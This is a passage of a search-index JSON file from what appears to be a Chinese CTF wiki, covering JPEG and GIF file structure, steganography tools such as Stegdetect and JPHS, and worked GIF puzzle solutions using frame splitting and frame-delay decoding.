\u4fee\u6539\u68c0\u6d4b\u7b97\u6cd5\u7684\u654f\u611f\u5ea6\uff0c\u8be5\u503c\u7684\u9ed8\u8ba4\u503c\u4e3a1\u3002\u68c0\u6d4b\u7ed3\u679c\u7684\u5339\u914d\u5ea6\u4e0e\u68c0\u6d4b\u7b97\u6cd5\u7684\u654f\u611f\u5ea6\u6210\u6b63\u6bd4\uff0c\u7b97\u6cd5\u654f\u611f\u5ea6\u7684\u503c\u8d8a\u5927\uff0c\u68c0\u6d4b\u51fa\u7684\u53ef\u7591\u6587\u4ef6\u5305\u542b\u654f\u611f\u4fe1\u606f\u7684\u53ef\u80fd\u6027\u8d8a\u5927\u3002\n-d \u6253\u5370\u5e26\u884c\u53f7\u7684\u8c03\u8bd5\u4fe1\u606f\u3002\n-t \u8bbe\u7f6e\u8981\u68c0\u6d4b\u54ea\u4e9b\u9690\u5199\u5de5\u5177\uff08\u9ed8\u8ba4\u68c0\u6d4bjopi\uff09\uff0c\u53ef\u8bbe\u7f6e\u7684\u9009\u9879\u5982\u4e0b\uff1a\nj \u68c0\u6d4b\u56fe\u50cf\u4e2d\u7684\u4fe1\u606f\u662f\u5426\u662f\u7528jsteg\u5d4c\u5165\u7684\u3002\no \u68c0\u6d4b\u56fe\u50cf\u4e2d\u7684\u4fe1\u606f\u662f\u5426\u662f\u7528outguess\u5d4c\u5165\u7684\u3002\np \u68c0\u6d4b\u56fe\u50cf\u4e2d\u7684\u4fe1\u606f\u662f\u5426\u662f\u7528jphide\u5d4c\u5165\u7684\u3002\ni \u68c0\u6d4b\u56fe\u50cf\u4e2d\u7684\u4fe1\u606f\u662f\u5426\u662f\u7528invisible secrets\u5d4c\u5165\u7684\u3002\n\n\n\n\nJPHS\n\n\nJPEG \u56fe\u50cf\u7684\u4fe1\u606f\u9690\u85cf\u8f6f\u4ef6 JPHS\uff0c\u5b83\u662f\u7531 Allan Latham \u5f00\u53d1\u8bbe\u8ba1\u5b9e\u73b0\u5728 Windows \u548c Linux \u7cfb\u7edf\u5e73\u53f0\u9488\u5bf9\u6709\u635f\u538b\u7f29 JPEG \u6587\u4ef6\u8fdb\u884c\u4fe1\u606f\u52a0\u5bc6\u9690\u85cf\u548c\u63a2\u6d4b\u63d0\u53d6\u7684\u5de5\u5177\u3002\u8f6f\u4ef6\u91cc\u9762\u4e3b\u8981\u5305\u542b\u4e86\u4e24\u4e2a\u7a0b\u5e8f JPHIDE\u548c JPSEEK\u3002JPHIDE \u7a0b\u5e8f\u4e3b\u8981\u662f\u5b9e\u73b0\u5c06\u4fe1\u606f\u6587\u4ef6\u52a0\u5bc6\u9690\u85cf\u5230 JPEG \u56fe\u50cf\u529f\u80fd\uff0c\u800c JPSEEK \u7a0b\u5e8f\u4e3b\u8981\u5b9e\u73b0\u4ece\u7528 JPHIDE \u7a0b\u5e8f\u52a0\u5bc6\u9690\u85cf\u5f97\u5230\u7684 JPEG \u56fe\u50cf\u63a2\u6d4b\u63d0\u53d6\u4fe1\u606f\u6587\u4ef6\uff0cWindows \u7248\u672c\u7684 JPHS \u91cc\u7684 JPHSWIN \u7a0b\u5e8f\u5177\u6709\u56fe\u5f62\u5316\u64cd\u4f5c\u754c\u9762\u4e14\u5177\u5907 JPHIDE \u548c JPSEEK \u7684\u529f\u80fd\u3002\n\n\nSilentEye\n\n\n\n\nSilentEye is a cross-platform application design for an easy use of steganography, in this case hiding messages into pictures or sounds. It provides a pretty nice interface and an easy integration of new steganography algorithm and cryptography process by using a plug-ins system.", 
            "title": "JPG"
        }, 
        {
            "location": "/misc/picture/jpg/#_1", 
            "text": "JPEG \u662f\u6709\u635f\u538b\u7f29\u683c\u5f0f\uff0c\u5c06\u50cf\u7d20\u4fe1\u606f\u7528 JPEG \u4fdd\u5b58\u6210\u6587\u4ef6\u518d\u8bfb\u53d6\u51fa\u6765\uff0c\u5176\u4e2d\u67d0\u4e9b\u50cf\u7d20\u503c\u4f1a\u6709\u5c11\u8bb8\u53d8\u5316\u3002\u5728\u4fdd\u5b58\u65f6\u6709\u4e2a\u8d28\u91cf\u53c2\u6570\u53ef\u5728 0 \u81f3 100 \u4e4b\u95f4\u9009\u62e9\uff0c\u53c2\u6570\u8d8a\u5927\u56fe\u7247\u5c31\u8d8a\u4fdd\u771f\uff0c\u4f46\u56fe\u7247\u7684\u4f53\u79ef\u4e5f\u5c31\u8d8a\u5927\u3002\u4e00\u822c\u60c5\u51b5\u4e0b\u9009\u62e9 70 \u6216 80 \u5c31\u8db3\u591f\u4e86  JPEG \u6ca1\u6709\u900f\u660e\u5ea6\u4fe1\u606f   JPG \u57fa\u672c\u6570\u636e\u7ed3\u6784\u4e3a\u4e24\u5927\u7c7b\u578b\uff1a\u300c\u6bb5\u300d\u548c\u7ecf\u8fc7\u538b\u7f29\u7f16\u7801\u7684\u56fe\u50cf\u6570\u636e\u3002     \u540d \u79f0  \u5b57\u8282\u6570  \u6570\u636e  \u8bf4\u660e      \u6bb5 \u6807\u8bc6  1  FF  \u6bcf\u4e2a\u65b0\u6bb5\u7684\u5f00\u59cb\u6807\u8bc6    \u6bb5\u7c7b\u578b  1   \u7c7b\u578b\u7f16\u7801\uff08\u79f0\u4f5c\u6807\u8bb0\u7801\uff09    \u6bb5\u957f \u5ea6  2   \u5305\u62ec\u6bb5\u5185\u5bb9\u548c\u6bb5\u957f\u5ea6\u672c\u8eab,\u4e0d\u5305\u62ec\u6bb5\u6807\u8bc6\u548c\u6bb5\u7c7b\u578b    \u6bb5\u5185\u5bb9  2   \u226465533\u5b57\u8282      \u6709\u4e9b\u6bb5\u6ca1\u6709\u957f\u5ea6\u63cf\u8ff0\u4e5f\u6ca1\u6709\u5185\u5bb9\uff0c\u53ea\u6709\u6bb5\u6807\u8bc6\u548c\u6bb5\u7c7b\u578b\u3002\u6587\u4ef6\u5934\u548c\u6587\u4ef6\u5c3e\u5747\u5c5e\u4e8e\u8fd9\u79cd\u6bb5\u3002  \u6bb5\u4e0e\u6bb5\u4e4b\u95f4\u65e0\u8bba\u6709\u591a\u5c11  FF  \u90fd\u662f\u5408\u6cd5\u7684\uff0c\u8fd9\u4e9b  FF  \u79f0\u4e3a\u300c\u586b\u5145\u5b57\u8282\u300d\uff0c\u5fc5\u987b\u88ab\u5ffd\u7565\u6389\u3002   \u4e00\u4e9b\u5e38\u89c1\u7684\u6bb5\u7c7b\u578b   0xffd8  \u548c  0xffd9 \u4e3a JPG \u6587\u4ef6\u7684\u5f00\u59cb\u7ed3\u675f\u7684\u6807\u5fd7\u3002", 
            "title": "\u6587\u4ef6\u7ed3\u6784"
        }, 
        {
            "location": "/misc/picture/jpg/#_2", 
            "text": "", 
            "title": "\u9690\u5199\u8f6f\u4ef6"
        }, 
        {
            "location": "/misc/picture/jpg/#stegdetect", 
            "text": "\u901a\u8fc7\u7edf\u8ba1\u5206\u6790\u6280\u672f\u8bc4\u4f30 JPEG \u6587\u4ef6\u7684 DCT \u9891\u7387\u7cfb\u6570\u7684\u9690\u5199\u5de5\u5177, \u53ef\u4ee5\u68c0\u6d4b\u5230\u901a\u8fc7 JSteg\u3001JPHide\u3001OutGuess\u3001Invisible\nSecrets\u3001F5\u3001appendX \u548c Camouflage \u7b49\u8fd9\u4e9b\u9690\u5199\u5de5\u5177\u9690\u85cf\u7684\u4fe1\u606f\uff0c\u5e76\u4e14\u8fd8\u5177\u6709\u57fa\u4e8e\u5b57\u5178\u66b4\u529b\u7834\u89e3\u5bc6\u7801\u65b9\u6cd5\u63d0\u53d6\u901a\u8fc7 Jphide\u3001outguess \u548c jsteg-shell \u65b9\u5f0f\u5d4c\u5165\u7684\u9690\u85cf\u4fe1\u606f\u3002  -q \u4ec5\u663e\u793a\u53ef\u80fd\u5305\u542b\u9690\u85cf\u5185\u5bb9\u7684\u56fe\u50cf\u3002\n-n \u542f\u7528\u68c0\u67e5JPEG\u6587\u4ef6\u5934\u529f\u80fd\uff0c\u4ee5\u964d\u4f4e\u8bef\u62a5\u7387\u3002\u5982\u679c\u542f\u7528\uff0c\u6240\u6709\u5e26\u6709\u6279\u6ce8\u533a\u57df\u7684\u6587\u4ef6\u5c06\u88ab\u89c6\u4e3a\u6ca1\u6709\u88ab\u5d4c\u5165\u4fe1\u606f\u3002\u5982\u679cJPEG\u6587\u4ef6\u7684JFIF\u6807\u8bc6\u7b26\u4e2d\u7684\u7248\u672c\u53f7\u4e0d\u662f1.1\uff0c\u5219\u7981\u7528OutGuess\u68c0\u6d4b\u3002\n-s \u4fee\u6539\u68c0\u6d4b\u7b97\u6cd5\u7684\u654f\u611f\u5ea6\uff0c\u8be5\u503c\u7684\u9ed8\u8ba4\u503c\u4e3a1\u3002\u68c0\u6d4b\u7ed3\u679c\u7684\u5339\u914d\u5ea6\u4e0e\u68c0\u6d4b\u7b97\u6cd5\u7684\u654f\u611f\u5ea6\u6210\u6b63\u6bd4\uff0c\u7b97\u6cd5\u654f\u611f\u5ea6\u7684\u503c\u8d8a\u5927\uff0c\u68c0\u6d4b\u51fa\u7684\u53ef\u7591\u6587\u4ef6\u5305\u542b\u654f\u611f\u4fe1\u606f\u7684\u53ef\u80fd\u6027\u8d8a\u5927\u3002\n-d \u6253\u5370\u5e26\u884c\u53f7\u7684\u8c03\u8bd5\u4fe1\u606f\u3002\n-t \u8bbe\u7f6e\u8981\u68c0\u6d4b\u54ea\u4e9b\u9690\u5199\u5de5\u5177\uff08\u9ed8\u8ba4\u68c0\u6d4bjopi\uff09\uff0c\u53ef\u8bbe\u7f6e\u7684\u9009\u9879\u5982\u4e0b\uff1a\nj \u68c0\u6d4b\u56fe\u50cf\u4e2d\u7684\u4fe1\u606f\u662f\u5426\u662f\u7528jsteg\u5d4c\u5165\u7684\u3002\no \u68c0\u6d4b\u56fe\u50cf\u4e2d\u7684\u4fe1\u606f\u662f\u5426\u662f\u7528outguess\u5d4c\u5165\u7684\u3002\np \u68c0\u6d4b\u56fe\u50cf\u4e2d\u7684\u4fe1\u606f\u662f\u5426\u662f\u7528jphide\u5d4c\u5165\u7684\u3002\ni \u68c0\u6d4b\u56fe\u50cf\u4e2d\u7684\u4fe1\u606f\u662f\u5426\u662f\u7528invisible secrets\u5d4c\u5165\u7684\u3002", 
            "title": "Stegdetect"
        }, 
        {
            "location": "/misc/picture/jpg/#jphs", 
            "text": "JPEG \u56fe\u50cf\u7684\u4fe1\u606f\u9690\u85cf\u8f6f\u4ef6 JPHS\uff0c\u5b83\u662f\u7531 Allan Latham \u5f00\u53d1\u8bbe\u8ba1\u5b9e\u73b0\u5728 Windows \u548c Linux \u7cfb\u7edf\u5e73\u53f0\u9488\u5bf9\u6709\u635f\u538b\u7f29 JPEG \u6587\u4ef6\u8fdb\u884c\u4fe1\u606f\u52a0\u5bc6\u9690\u85cf\u548c\u63a2\u6d4b\u63d0\u53d6\u7684\u5de5\u5177\u3002\u8f6f\u4ef6\u91cc\u9762\u4e3b\u8981\u5305\u542b\u4e86\u4e24\u4e2a\u7a0b\u5e8f JPHIDE\u548c JPSEEK\u3002JPHIDE \u7a0b\u5e8f\u4e3b\u8981\u662f\u5b9e\u73b0\u5c06\u4fe1\u606f\u6587\u4ef6\u52a0\u5bc6\u9690\u85cf\u5230 JPEG \u56fe\u50cf\u529f\u80fd\uff0c\u800c JPSEEK \u7a0b\u5e8f\u4e3b\u8981\u5b9e\u73b0\u4ece\u7528 JPHIDE \u7a0b\u5e8f\u52a0\u5bc6\u9690\u85cf\u5f97\u5230\u7684 JPEG \u56fe\u50cf\u63a2\u6d4b\u63d0\u53d6\u4fe1\u606f\u6587\u4ef6\uff0cWindows \u7248\u672c\u7684 JPHS \u91cc\u7684 JPHSWIN \u7a0b\u5e8f\u5177\u6709\u56fe\u5f62\u5316\u64cd\u4f5c\u754c\u9762\u4e14\u5177\u5907 JPHIDE \u548c JPSEEK \u7684\u529f\u80fd\u3002", 
            "title": "JPHS"
        }, 
        {
            "location": "/misc/picture/jpg/#silenteye", 
            "text": "SilentEye is a cross-platform application design for an easy use of steganography, in this case hiding messages into pictures or sounds. It provides a pretty nice interface and an easy integration of new steganography algorithm and cryptography process by using a plug-ins system.", 
            "title": "SilentEye"
        }, 
        {
            "location": "/misc/picture/gif/", 
            "text": "\u6587\u4ef6\u7ed3\u6784\n\n\n\u4e00\u4e2aGIF\u6587\u4ef6\u7684\u7ed3\u6784\u53ef\u5206\u4e3a\n\n\n\n\n\u6587\u4ef6\u5934\uff08File Header\uff09\n\n\nGIF \u6587\u4ef6\u7f72\u540d\uff08Signature\uff09\n\n\n\u7248\u672c\u53f7\uff08Version\uff09\n\n\n\n\n\n\nGIF \u6570\u636e\u6d41\uff08GIF Data Stream\uff09\n\n\n\u63a7\u5236\u6807\u8bc6\u7b26\n\n\n\u56fe\u8c61\u5757\uff08Image Block\uff09\n\n\n\u5176\u4ed6\u7684\u4e00\u4e9b\u6269\u5c55\u5757\n\n\n\n\n\n\n\u6587\u4ef6\u7ec8\u7ed3\u5668\uff08Trailer\uff09\n\n\n\n\n\u4e0b\u8868\u663e\u793a\u4e86\u4e00\u4e2a GIF \u6587\u4ef6\u7684\u7ec4\u6210\u7ed3\u6784\uff1a\n\n\n\n\n\u4e2d\u95f4\u7684\u90a3\u4e2a\u5927\u5757\u53ef\u4ee5\u88ab\u91cd\u590d\u4efb\u610f\u6b21\n\n\n\u6587\u4ef6\u5934\n\n\nGIF \u7f72\u540d\uff08Signature\uff09\u548c\u7248\u672c\u53f7\uff08Version\uff09\u3002GIF \u7f72\u540d\u7528\u6765\u786e\u8ba4\u4e00\u4e2a\u6587\u4ef6\u662f\u5426\u662f GIF \u683c\u5f0f\u7684\u6587\u4ef6\uff0c\u8fd9\u4e00\u90e8\u5206\u7531\u4e09\u4e2a\u5b57\u7b26\u7ec4\u6210\uff1a\nGIF\n\uff1b\u6587\u4ef6\u7248\u672c\u53f7\u4e5f\u662f\u7531\u4e09\u4e2a\u5b57\u8282\u7ec4\u6210\uff0c\u53ef\u4ee5\u4e3a \n87a\n \u6216 \n89a\n\u3002\n\n\n\u903b\u8f91\u5c4f\u5e55\u6807\u8bc6\u7b26\uff08Logical Screen Descriptor\uff09\n\n\nLogical Screen Descriptor\uff08\u903b\u8f91\u5c4f\u5e55\u63cf\u8ff0\u7b26\uff09\u7d27\u8ddf\u5728 header \u540e\u9762\u3002\u8fd9\u4e2a\u5757\u544a\u8bc9 decoder\uff08\u89e3\u7801\u5668\uff09\u56fe\u7247\u9700\u8981\u5360\u7528\u7684\u7a7a\u95f4\u3002\u5b83\u7684\u5927\u5c0f\u56fa\u5b9a\u4e3a 7 \u4e2a\u5b57\u8282\uff0c\u4ee5 canvas width\uff08\u753b\u5e03\u5bbd\u5ea6\uff09\u548c canvas height\uff08\u753b\u5e03\u9ad8\u5ea6\uff09\u5f00\u59cb\u3002\n\n\n\u5168\u5c40\u989c\u8272\u5217\u8868\uff08Global Color Table\uff09\n\n\nGIF\u683c\u5f0f\u53ef\u4ee5\u62e5\u6709global color table\uff0c\u6216\u7528\u4e8e\u9488\u5bf9\u6bcf\u4e2a\u5b50\u56fe\u7247\u96c6\uff0c\u63d0\u4f9blocal color table\u3002\u6bcf\u4e2acolor\ntable\u7531\u4e00\u4e2aRGB\uff08\u5c31\u50cf\u901a\u5e38\u6211\u4eec\u89c1\u5230\u7684\uff08255\uff0c0\uff0c0\uff09\u7ea2\u8272 \u90a3\u79cd\uff09\u5217\u8868\u7ec4\u6210\u3002\n\n\n\u56fe\u50cf\u6807\u8bc6\u7b26\uff08Image Descriptor\uff09\n\n\n\u4e00\u4e2a GIF \u6587\u4ef6\u4e00\u822c\u5305\u542b\u591a\u4e2a\u56fe\u7247\u3002\u4e4b\u524d\u7684\u56fe\u7247\u6e32\u67d3\u6a21\u5f0f\u4e00\u822c\u662f\u5c06\u591a\u4e2a\u56fe\u7247\u7ed8\u5236\u5230\u4e00\u4e2a\u5927\u7684\uff08virtual\ncanvas\uff09\u865a\u62df\u753b\u5e03\u4e0a\uff0c\u800c\u73b0\u5728\u4e00\u822c\u5c06\u8fd9\u4e9b\u56fe\u7247\u96c6\u7528\u4e8e\u5b9e\u73b0\u52a8\u753b\u3002\n\n\n\u6bcf\u4e2a image \u90fd\u4ee5\u4e00\u4e2a image descriptor block\uff08\u56fe\u50cf\u63cf\u8ff0\u5757\uff09\u4f5c\u4e3a\u5f00\u5934\uff0c\u8fd9\u4e2a\u5757\u56fa\u5b9a\u4e3a 10 \u5b57\u8282\u3002\n\n\n\n\n\u56fe\u50cf\u6570\u636e\uff08Image Data\uff09\n\n\n\u7ec8\u4e8e\u5230\u4e86\u56fe\u7247\u6570\u636e\u5b9e\u9645\u5b58\u50a8\u7684\u5730\u65b9\u3002Image Data\u662f\u7531\u4e00\u7cfb\u5217\u7684\u8f93\u51fa\u7f16\u7801\uff08output codes\uff09\u6784\u6210\uff0c\u5b83\u4eec\u544a\u8bc9decoder\uff08\u89e3\u7801\u5668\uff09\u9700\u8981\u7ed8\u5236\u5728\u753b\u5e03\u4e0a\u7684\u6bcf\u4e2a\u989c\u8272\u4fe1\u606f\u3002\u8fd9\u4e9b\u7f16\u7801\u4ee5\u5b57\u8282\u7801\u7684\u5f62\u5f0f\u7ec4\u7ec7\u5728\u8fd9\u4e2a\u5757\u4e2d\u3002\n\n\n\u6587\u4ef6\u7ec8\u7ed3\u5668\uff08Trailer\uff09\n\n\n\u8be5\u5757\u4e3a\u4e00\u4e2a\u5355\u5b57\u6bb5\u5757\uff0c\u7528\u6765\u6307\u793a\u8be5\u6570\u636e\u6d41\u7684\u7ed3\u675f\u3002\u53d6\u56fa\u5b9a\u503c0x3b.\n\n\n\u66f4\u591a\u53c2\u89c1 \ngif \u683c\u5f0f\u56fe\u7247\u8be6\u7ec6\u89e3\u6790\n\n\n\u7a7a\u95f4\u8f74\n\n\n\u7531\u4e8eGIF\u7684\u52a8\u6001\u7279\u6027\uff0c\u7531\u4e00\u5e27\u5e27\u7684\u56fe\u7247\u6784\u6210\uff0c\u6240\u4ee5\u6bcf\u4e00\u5e27\u7684\u56fe\u7247\uff0c\u591a\u5e27\u56fe\u7247\u95f4\u7684\u7ed3\u5408\uff0c\u90fd\u6210\u4e86\u9690\u85cf\u4fe1\u606f\u7684\u4e00\u79cd\u8f7d\u4f53\u3002\n\n\n\u5bf9\u4e8e\u9700\u8981\u5206\u79bb\u7684GIF\u6587\u4ef6,\u53ef\u4ee5\u4f7f\u7528\nconvert\n\u547d\u4ee4\u5c06\u5176\u6bcf\u4e00\u5e27\u5206\u5272\u5f00\u6765\n\n\n``` sourceCode shell\nroot in ~/Desktop/tmp \u03bb convert cake.gif cake.png\nroot in ~/Desktop/tmp \u03bb ls\ncake-0.png  cake-1.png  cake-2.png  cake-3.png  cake.gif\n\n### \u4f8b\u9898\n\n\n WDCTF-2017:3-2\n\n\u6253\u5f00gif\u540e\uff0c\u601d\u8def\u5f88\u6e05\u6670\uff0c\u5206\u79bb\u6bcf\u4e00\u5e27\u56fe\u7247\u540e\uff0c\u5c06\u8d77\u5408\u5e76\u5f97\u5230\u5b8c\u6574\u7684\u4e8c\u7ef4\u7801\u5373\u53ef\n\n``` sourceCode python\nfrom  PIL import Image\n\n\nflag = Image.new(\nRGB\n,(450,450))\n\nfor i in range(2):\n    for j in range(2):\n        pot = \ncake-{}.png\n.format(j+i*2)\n        potImage = Image.open(pot)\n        flag.paste(potImage,(j*225,i*225))\nflag.save(\n./flag.png\n)\n\n\n\n\u626b\u7801\u540e\u5f97\u5230\u4e00\u4e3216\u8fdb\u5236\u5b57\u7b26\u4e32\n\n\n03f30d0ab8c1aa5....74080006030908\n\n\n\u5f00\u5934\n03f3\n\u4e3a\npyc\n\u6587\u4ef6\u7684\u5934\uff0c\u6062\u590d\u4e3a\npython\n\u811a\u672c\u540e\u76f4\u63a5\u8fd0\u884c\u5f97\u5230flag\n\n\n\u65f6\u95f4\u8f74\n\n\nGIF\u6587\u4ef6\u6bcf\u4e00\u5e27\u95f4\u7684\u65f6\u95f4\u95f4\u9694\u4e5f\u53ef\u4ee5\u4f5c\u4e3a\u4fe1\u606f\u9690\u85cf\u7684\u8f7d\u4f53\u3002\n\n\n\u4f8b\u5982\u5728\u5f53\u65f6\u5728XMan\u9009\u62d4\u8d5b\u51fa\u7684\u4e00\u9898\n\n\n\n\nXMAN-2017:100.gif\n\n\n\n\n\u901a\u8fc7\nidentify\n\u547d\u4ee4\u6e05\u6670\u7684\u6253\u5370\u51fa\u6bcf\u4e00\u5e27\u7684\u65f6\u95f4\u95f4\u9694\n\n\n$ identify -format \n%s %T \\n\n \n100\n.gif\n\n0\n \n66\n\n\n1\n \n66\n\n\n2\n \n20\n\n\n3\n \n10\n\n\n4\n \n20\n\n\n5\n \n10\n\n\n6\n \n10\n\n\n7\n \n20\n\n\n8\n \n20\n\n\n9\n \n20\n\n\n10\n \n20\n\n\n11\n \n10\n\n\n12\n \n20\n\n\n13\n \n20\n\n\n14\n \n10\n\n\n15\n \n10\n\n\n\n\n\n\u63a8\u65ad \n20 \n 10\n  \u5206\u522b\u4ee3\u8868 \n0 \n 1\n\uff0c\u63d0\u53d6\u6bcf\u4e00\u5e27\u95f4\u9694\u5e76\u8fdb\u884c\u8f6c\u5316\u3002\n\n\n$ cat flag\n|\ncut -d \n \n -f \n2\n|\ntr -d \n66\n|\ntr -d \n\\n\n|\ntr -d \n0\n|\ntr \n2\n \n0\n\n\n0101100001001101010000010100111001111011001110010011011000110101001101110011010101100010011001010110010101100100001101000110010001100101011000010011000100111000011001000110010101100100001101000011011100110011001101010011011000110100001100110110000101100101011000110110011001100001001100110011010101111101\n#\n\n\n\n\n\n\u6700\u540e\u8f6c ASCII \u7801\u5f97\u5230 flag\u3002\n\n\n\u9690\u5199\u8f6f\u4ef6\n\n\n\n\nF5-steganography", 
            "title": "GIF"
        }, 
        {
            "location": "/misc/picture/gif/#_1", 
            "text": "\u4e00\u4e2aGIF\u6587\u4ef6\u7684\u7ed3\u6784\u53ef\u5206\u4e3a   \u6587\u4ef6\u5934\uff08File Header\uff09  GIF \u6587\u4ef6\u7f72\u540d\uff08Signature\uff09  \u7248\u672c\u53f7\uff08Version\uff09    GIF \u6570\u636e\u6d41\uff08GIF Data Stream\uff09  \u63a7\u5236\u6807\u8bc6\u7b26  \u56fe\u8c61\u5757\uff08Image Block\uff09  \u5176\u4ed6\u7684\u4e00\u4e9b\u6269\u5c55\u5757    \u6587\u4ef6\u7ec8\u7ed3\u5668\uff08Trailer\uff09   \u4e0b\u8868\u663e\u793a\u4e86\u4e00\u4e2a GIF \u6587\u4ef6\u7684\u7ec4\u6210\u7ed3\u6784\uff1a   \u4e2d\u95f4\u7684\u90a3\u4e2a\u5927\u5757\u53ef\u4ee5\u88ab\u91cd\u590d\u4efb\u610f\u6b21", 
            "title": "\u6587\u4ef6\u7ed3\u6784"
        }, 
        {
            "location": "/misc/picture/gif/#_2", 
            "text": "GIF \u7f72\u540d\uff08Signature\uff09\u548c\u7248\u672c\u53f7\uff08Version\uff09\u3002GIF \u7f72\u540d\u7528\u6765\u786e\u8ba4\u4e00\u4e2a\u6587\u4ef6\u662f\u5426\u662f GIF \u683c\u5f0f\u7684\u6587\u4ef6\uff0c\u8fd9\u4e00\u90e8\u5206\u7531\u4e09\u4e2a\u5b57\u7b26\u7ec4\u6210\uff1a GIF \uff1b\u6587\u4ef6\u7248\u672c\u53f7\u4e5f\u662f\u7531\u4e09\u4e2a\u5b57\u8282\u7ec4\u6210\uff0c\u53ef\u4ee5\u4e3a  87a  \u6216  89a \u3002", 
            "title": "\u6587\u4ef6\u5934"
        }, 
        {
            "location": "/misc/picture/gif/#logical-screen-descriptor", 
            "text": "Logical Screen Descriptor\uff08\u903b\u8f91\u5c4f\u5e55\u63cf\u8ff0\u7b26\uff09\u7d27\u8ddf\u5728 header \u540e\u9762\u3002\u8fd9\u4e2a\u5757\u544a\u8bc9 decoder\uff08\u89e3\u7801\u5668\uff09\u56fe\u7247\u9700\u8981\u5360\u7528\u7684\u7a7a\u95f4\u3002\u5b83\u7684\u5927\u5c0f\u56fa\u5b9a\u4e3a 7 \u4e2a\u5b57\u8282\uff0c\u4ee5 canvas width\uff08\u753b\u5e03\u5bbd\u5ea6\uff09\u548c canvas height\uff08\u753b\u5e03\u9ad8\u5ea6\uff09\u5f00\u59cb\u3002", 
            "title": "\u903b\u8f91\u5c4f\u5e55\u6807\u8bc6\u7b26\uff08Logical Screen Descriptor\uff09"
        }, 
        {
            "location": "/misc/picture/gif/#global-color-table", 
            "text": "GIF\u683c\u5f0f\u53ef\u4ee5\u62e5\u6709global color table\uff0c\u6216\u7528\u4e8e\u9488\u5bf9\u6bcf\u4e2a\u5b50\u56fe\u7247\u96c6\uff0c\u63d0\u4f9blocal color table\u3002\u6bcf\u4e2acolor\ntable\u7531\u4e00\u4e2aRGB\uff08\u5c31\u50cf\u901a\u5e38\u6211\u4eec\u89c1\u5230\u7684\uff08255\uff0c0\uff0c0\uff09\u7ea2\u8272 \u90a3\u79cd\uff09\u5217\u8868\u7ec4\u6210\u3002", 
            "title": "\u5168\u5c40\u989c\u8272\u5217\u8868\uff08Global Color Table\uff09"
        }, 
        {
            "location": "/misc/picture/gif/#image-descriptor", 
            "text": "\u4e00\u4e2a GIF \u6587\u4ef6\u4e00\u822c\u5305\u542b\u591a\u4e2a\u56fe\u7247\u3002\u4e4b\u524d\u7684\u56fe\u7247\u6e32\u67d3\u6a21\u5f0f\u4e00\u822c\u662f\u5c06\u591a\u4e2a\u56fe\u7247\u7ed8\u5236\u5230\u4e00\u4e2a\u5927\u7684\uff08virtual\ncanvas\uff09\u865a\u62df\u753b\u5e03\u4e0a\uff0c\u800c\u73b0\u5728\u4e00\u822c\u5c06\u8fd9\u4e9b\u56fe\u7247\u96c6\u7528\u4e8e\u5b9e\u73b0\u52a8\u753b\u3002  \u6bcf\u4e2a image \u90fd\u4ee5\u4e00\u4e2a image descriptor block\uff08\u56fe\u50cf\u63cf\u8ff0\u5757\uff09\u4f5c\u4e3a\u5f00\u5934\uff0c\u8fd9\u4e2a\u5757\u56fa\u5b9a\u4e3a 10 \u5b57\u8282\u3002", 
            "title": "\u56fe\u50cf\u6807\u8bc6\u7b26\uff08Image Descriptor\uff09"
        }, 
        {
            "location": "/misc/picture/gif/#image-data", 
            "text": "\u7ec8\u4e8e\u5230\u4e86\u56fe\u7247\u6570\u636e\u5b9e\u9645\u5b58\u50a8\u7684\u5730\u65b9\u3002Image Data\u662f\u7531\u4e00\u7cfb\u5217\u7684\u8f93\u51fa\u7f16\u7801\uff08output codes\uff09\u6784\u6210\uff0c\u5b83\u4eec\u544a\u8bc9decoder\uff08\u89e3\u7801\u5668\uff09\u9700\u8981\u7ed8\u5236\u5728\u753b\u5e03\u4e0a\u7684\u6bcf\u4e2a\u989c\u8272\u4fe1\u606f\u3002\u8fd9\u4e9b\u7f16\u7801\u4ee5\u5b57\u8282\u7801\u7684\u5f62\u5f0f\u7ec4\u7ec7\u5728\u8fd9\u4e2a\u5757\u4e2d\u3002", 
            "title": "\u56fe\u50cf\u6570\u636e\uff08Image Data\uff09"
        }, 
        {
            "location": "/misc/picture/gif/#trailer", 
            "text": "\u8be5\u5757\u4e3a\u4e00\u4e2a\u5355\u5b57\u6bb5\u5757\uff0c\u7528\u6765\u6307\u793a\u8be5\u6570\u636e\u6d41\u7684\u7ed3\u675f\u3002\u53d6\u56fa\u5b9a\u503c0x3b.  \u66f4\u591a\u53c2\u89c1  gif \u683c\u5f0f\u56fe\u7247\u8be6\u7ec6\u89e3\u6790", 
            "title": "\u6587\u4ef6\u7ec8\u7ed3\u5668\uff08Trailer\uff09"
        }, 
        {
            "location": "/misc/picture/gif/#_3", 
            "text": "\u7531\u4e8eGIF\u7684\u52a8\u6001\u7279\u6027\uff0c\u7531\u4e00\u5e27\u5e27\u7684\u56fe\u7247\u6784\u6210\uff0c\u6240\u4ee5\u6bcf\u4e00\u5e27\u7684\u56fe\u7247\uff0c\u591a\u5e27\u56fe\u7247\u95f4\u7684\u7ed3\u5408\uff0c\u90fd\u6210\u4e86\u9690\u85cf\u4fe1\u606f\u7684\u4e00\u79cd\u8f7d\u4f53\u3002  \u5bf9\u4e8e\u9700\u8981\u5206\u79bb\u7684GIF\u6587\u4ef6,\u53ef\u4ee5\u4f7f\u7528 convert \u547d\u4ee4\u5c06\u5176\u6bcf\u4e00\u5e27\u5206\u5272\u5f00\u6765  ``` sourceCode shell\nroot in ~/Desktop/tmp \u03bb convert cake.gif cake.png\nroot in ~/Desktop/tmp \u03bb ls\ncake-0.png  cake-1.png  cake-2.png  cake-3.png  cake.gif ### \u4f8b\u9898  WDCTF-2017:3-2\n\n\u6253\u5f00gif\u540e\uff0c\u601d\u8def\u5f88\u6e05\u6670\uff0c\u5206\u79bb\u6bcf\u4e00\u5e27\u56fe\u7247\u540e\uff0c\u5c06\u8d77\u5408\u5e76\u5f97\u5230\u5b8c\u6574\u7684\u4e8c\u7ef4\u7801\u5373\u53ef\n\n``` sourceCode python\nfrom  PIL import Image\n\n\nflag = Image.new( RGB ,(450,450))\n\nfor i in range(2):\n    for j in range(2):\n        pot =  cake-{}.png .format(j+i*2)\n        potImage = Image.open(pot)\n        flag.paste(potImage,(j*225,i*225))\nflag.save( ./flag.png )  \u626b\u7801\u540e\u5f97\u5230\u4e00\u4e3216\u8fdb\u5236\u5b57\u7b26\u4e32  03f30d0ab8c1aa5....74080006030908  \u5f00\u5934 03f3 \u4e3a pyc \u6587\u4ef6\u7684\u5934\uff0c\u6062\u590d\u4e3a python \u811a\u672c\u540e\u76f4\u63a5\u8fd0\u884c\u5f97\u5230flag", 
            "title": "\u7a7a\u95f4\u8f74"
        }, 
        {
